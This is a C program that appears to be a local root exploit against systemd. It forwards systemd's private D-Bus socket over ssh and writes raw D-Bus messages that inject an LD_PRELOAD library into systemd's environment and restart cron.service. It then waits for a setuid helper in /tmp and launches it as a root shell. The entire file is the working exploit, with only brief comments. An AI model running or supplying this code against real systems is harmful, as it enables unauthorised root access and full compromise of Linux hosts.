#include <sys/socket.h>
#include <sys/un.h>
#include <sys/types.h>
#include <unistd.h>
#include <errno.h>
#include <sys/stat.h>
#include <err.h>
#include <stdlib.h>
#include <stdio.h>

#define FORWARDED_SOCKET_PATH "/tmp/forwarded_systemd_socket"

static const char systemd_messages[] =
	/* init */
	"\0AUTH EXTERNAL 30"
	"\r\nNEGOTIATE_UNIX_FD\r\nBEGIN\r\n"

	/* set environment */
	"l\1\0\0011\0\0\0\1\0\0\0\240\0\0\0\1\1o\0\31\0\0\0/org/freedesktop/systemd1\0\0\0\0\0\0\0\3\1s\0"
	"\16\0\0\0SetEnvironment\0\0\2\1s\0 \0\0\0org.freedesktop.systemd1.Manager\0\0\0\0\0\0\0\0\6\1s\0"
	"\30\0\0\0org.freedesktop.systemd1\0\0\0\0\0\0\0\0\10\1g\0\2as\0"
	"-\0\0\0(\0\0\0LD_PRELOAD=/tmp/systemd_injected_library\0"

	/* restart cron */
	"l\1\0\1 \0\0\0\1\0\0\0\240\0\0\0\1\1o\0\31\0\0\0/org/freedesktop/systemd1\0\0\0\0\0\0\0\3\1s\0"
	"\v\0\0\0RestartUnit\0\0\0\0\0\2\1s\0 \0\0\0org.freedesktop.systemd1.Manager\0\0\0\0\0\0\0\0\6\1s\0"
	"\30\0\0\0org.freedesktop.systemd1\0\0\0\0\0\0\0\0\10\1g\0\2ss\0"
	"\f\0\0\0cron.service\0\0\0\0\7\0\0\0replace\0"
;

int main(void) {
	/* create forwarding socket */
	if (unlink(FORWARDED_SOCKET_PATH) && errno != ENOENT)
		err(1, "unlink");
	if (system("ssh -f -oExitOnForwardFailure=yes -L "FORWARDED_SOCKET_PATH":/run/systemd/private localhost sleep 60"))
		errx(1, "ssh failed");

	/* tell systemd to load our library */
	int sock = socket(PF_LOCAL, SOCK_STREAM, 0);
	if (sock < 0) err(1, "socket");
	struct sockaddr_un addr = {
		.sun_family = AF_UNIX,
		.sun_path = FORWARDED_SOCKET_PATH
	};
	if (connect(sock, (struct sockaddr *)&addr, sizeof(addr))) err(1, "connect");
	if (write(sock, systemd_messages, sizeof(systemd_messages)-1) != sizeof(systemd_messages)-1) err(1, "write");

	/* get root shell */
	struct stat helperstat;
	while (1) {
		if (stat("/tmp/suidhelper", &helperstat))
			err(1, "stat suidhelper");
		if (helperstat.st_mode & S_ISUID)
			break;
		usleep(100000);
	}
	close(sock);
	fputs("suid file detected, launching rootshell...\n", stderr);
	execl("/tmp/suidhelper", "suidhelper", NULL);
	err(1, "execl suidhelper");

	return 0;
}
